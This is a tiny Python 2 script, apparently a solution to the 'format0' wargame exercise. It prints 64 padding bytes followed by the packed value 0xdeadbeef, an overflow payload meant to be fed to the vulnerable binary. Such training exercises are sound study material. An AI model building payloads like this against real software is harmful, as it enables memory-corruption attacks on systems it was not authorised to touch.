#!/usr/bin/python
import struct



#NOTE
#./format0 $(./exploit.py)



PAD = "A" * 64

TARGET = struct.pack("I", 0xdeadbeef)

exploit = PAD + TARGET

print exploit
